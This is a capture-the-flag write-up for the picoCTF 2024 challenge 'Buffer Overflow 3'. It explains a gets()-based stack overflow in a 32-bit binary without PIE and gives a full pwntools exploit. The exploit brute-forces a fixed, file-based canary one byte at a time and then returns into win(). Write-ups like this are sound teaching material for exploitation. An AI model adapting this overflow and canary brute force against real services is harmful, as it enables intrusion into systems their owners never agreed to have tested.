picoCTF 2024 — Buffer Overflow 3

Category: pwn  |  Points: 300  |  Difficulty: Medium

Challenge Description

Do you think you can bypass the canary?
Connect to the program and get the flag.

Initial Analysis

Let's start by running checksec on the binary:

$ checksec --file=vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

So we have a stack canary to deal with. But note that this is a 32-bit binary with no PIE — that means we know exactly where the code lives in memory.

Reversing the Binary

Opening in Ghidra reveals the main loop:

void vuln() {
  char buf[64];
  char canary[4];
  // canary is read from a FILE — not randomized!
  gets(buf);
}

The key insight: the "canary" here isn't a real kernel stack canary — it's read from a file and stored as a fixed string. We can brute-force it one byte at a time!

Exploit Plan

  1. Brute-force the 4-byte canary (256^4 = 4 billion max, but one byte at a time = 256×4 = 1024 max attempts)
  2. Overflow past the canary with our known value
  3. Overwrite the return address with the address of win()

Exploit Script

from pwn import *

binary = './vuln'
elf    = ELF(binary)
win    = elf.symbols['win']

def try_canary(canary_prefix):
    p = remote('saturn.picoctf.net', 50000)
    p.recvuntil(b'>')
    p.sendline(b'A' * 64 + canary_prefix)
    response = p.recvline()
    p.close()
    return b'Stack Smashing' not in response

# Brute-force the canary byte by byte
canary = b''
for _ in range(4):
    for byte in range(256):
        candidate = canary + bytes([byte])
        if try_canary(candidate):
            canary += bytes([byte])
            log.success(f'Canary so far: {canary.hex()}')
            break

log.success(f'Full canary: {canary.hex()}')

# Final exploit
p = remote('saturn.picoctf.net', 50000)
payload  = b'A' * 64          # fill buffer
payload += canary              # correct canary
payload += b'B' * 16          # saved registers
payload += p32(win)            # overwrite return addr

p.recvuntil(b'>')
p.sendline(payload)
p.interactive()

Key Takeaways

  • Always check if stack canaries are truly random or file-based
  • One-byte-at-a-time brute-force dramatically reduces the search space
  • No PIE + known win() address = trivial ret2win after bypassing canary
